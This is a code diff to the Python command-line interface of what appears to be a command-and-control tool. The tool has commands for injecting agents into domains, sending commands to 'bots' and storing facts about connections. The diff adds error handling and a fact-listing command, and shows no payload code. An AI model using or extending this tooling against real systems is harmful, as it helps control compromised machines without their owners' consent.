@@ -114,6 +114,10 @@ def c2action(_config, _offsets, _args):
         except ActionRequirementsNotSatisfied:
             print("Some required facts is missing for specified action. Check the description "
                   "with 'c2describeaction'")
+        except InvalidConnUUID:
+            print("Invalid connection UUID")
+        except NotAliveConnection:
+            print("Can't send commands to dead bots")
 
 
 def c2operation(_config, _offsets, _args):
@@ -124,40 +128,51 @@ def c2operation(_config, _offsets, _args):
     if operation not in available:
         print("Invalid operation. Use 'c2listops' to see the available operations")
     else:
-        operation_obj: c2ops.C2Operation = c2ops.__getattribute__(operation)()
-        report = operation_obj.performOperation(conn_uuid)
-        print(report)
+        try:
+            operation_obj: c2ops.C2Operation = c2ops.__getattribute__(operation)()
+            report = operation_obj.performOperation(conn_uuid)
+            print(report)
+        except InvalidConnUUID:
+            print("Invalid connection UUID")
+        except NotAliveConnection:
+            print("Can't send commands to dead bots")
 
 
 def c2getfact(_config, _offsets, _args):
     conn_uuid = _args[0]
     fact_name = _args[1]
-    factsStorage = c2facts.FactsStorage(c2facts.ConnectionStorage(), conn_uuid)
     try:
-        fact_value = factsStorage.getFact(fact_name)
-        if isinstance(fact_value, list):
-            fact_value = ", ".join(fact_value)
-        print(f"{fact_name}: {fact_value}")
-    except c2facts.NotExistentFact:
-        print("The fact you tried to read is not set for specified connection")
+        factsStorage = c2facts.FactsStorage(c2facts.ConnectionStorage(), conn_uuid)
+        try:
+            fact_value = factsStorage.getFact(fact_name)
+            if isinstance(fact_value, list):
+                fact_value = ", ".join(fact_value)
+            print(f"{fact_name}: {fact_value}")
+        except c2facts.NotExistentFact:
+            print("The fact you tried to read is not set for specified connection")
+    except InvalidConnUUID:
+        print("Invalid connection UUID")
 
 
 def c2setfact(_config, _offsets, _args):
     conn_uuid = _args[0]
     fact_name = _args[1]
     fact_value = _args[2]
-    factsStorage = c2facts.FactsStorage(c2facts.ConnectionStorage(), conn_uuid)
     try:
-        old_value = factsStorage.getFact(fact_name)
-        print(f"Old {fact_name}: {old_value}")
-    except c2facts.NotExistentFact:
-        print("You're about to create a new fact for specified connection")
-    factsStorage.setFact(fact_name, fact_value)
-    try:
-        new_value = factsStorage.getFact(fact_name)
-        print(f"New {fact_name}: {new_value}")
-    except c2facts.NotExistentFact:
-        print("Some error occurred: the fact has not been set")
+        factsStorage = c2facts.FactsStorage(c2facts.ConnectionStorage(), conn_uuid)
+        try:
+            old_value = factsStorage.getFact(fact_name)
+            print(f"Old {fact_name}: {old_value}")
+        except c2facts.NotExistentFact:
+            print("You're about to create a new fact for specified connection")
+        factsStorage.setFact(fact_name, fact_value)
+        try:
+            new_value = factsStorage.getFact(fact_name)
+            print(f"New {fact_name}: {new_value}")
+        except c2facts.NotExistentFact:
+            print("Some error occurred: the fact has not been set")
+    except InvalidConnUUID:
+        print("Invalid connection UUID")
 
 
 def c2listactions(_config, _offsets, _args):
@@ -198,16 +213,26 @@ def c2describeop(_config, _offsets, _args):
         print(description)
 
 
+def c2listfacts(_config, _offsets, _args):
+    conn_uuid = _args[0]
+    try:
+        factsStorage = c2facts.FactsStorage(c2facts.ConnectionStorage(), conn_uuid)
+        fact_names = [fact_name for fact_name in factsStorage.getConn()['facts'].keys()]
+        fact_names = ", ".join(fact_names)
+        print(f"Fact names for {conn_uuid}: {fact_names}")
+    except InvalidConnUUID:
+        print("Invalid connection UUID")
+
+
 def command_line_interface(_config, _offsets, stream_req_handler=None):
-    # TODO: c2listfacts <conn_uuid>
     options = ["domlist", "dominject", "c2list", "c2send", "c2read", "c2action", "c2operation",
                "c2getfact", "c2setfact", "c2listactions", "c2listops", "c2describeaction",
-               "c2describeop", "showconf", "modconf", "quit", "help", "info"]
+               "c2describeop", "c2listfacts", "showconf", "modconf", "quit", "help", "info"]
     funcs = {'domlist': domlist, 'dominject': dominject, 'c2list': c2list, 'c2send': c2send,
              'c2read': c2read, 'c2action': c2action, 'c2operation': c2operation,
              'c2getfact': c2getfact, 'c2setfact': c2setfact, 'c2listactions': c2listactions,
              'c2listops': c2listops, 'c2describeaction': c2describeaction, 'c2describeop': c2describeop,
-             'showconf': showconf, 'modconf': modconf}
+             'c2listfacts': c2listfacts, 'showconf': showconf, 'modconf': modconf}
     infos = {'domlist': 'Usage: domlist\nList available domains',
              'dominject': 'Usage: dominject <domain>\nInject agent into domain',
              'c2list': 'Usage: c2list\nList all connections to C2 server',
@@ -232,6 +257,8 @@ def command_line_interface(_config, _offsets, stream_req_handler=None):
                                  'Obtain details about the specified action',
              'c2describeop': 'Usage: c2describeop <operation_name>\n'
                              'Obtain details about the specified operation',
+             'c2listfacts': 'Usage: c2listfacts <conn_uuid>\n'
+                            'List fact names available for the specified connection',
              'showconf': 'Usage: showconf\nShow configuration',
              'modconf': 'Usage: modconf <conf_parameter> <new_value>\nChange value of specified parameter\n'
                         f'Changeable values: {", ".join(changeable)}\n'
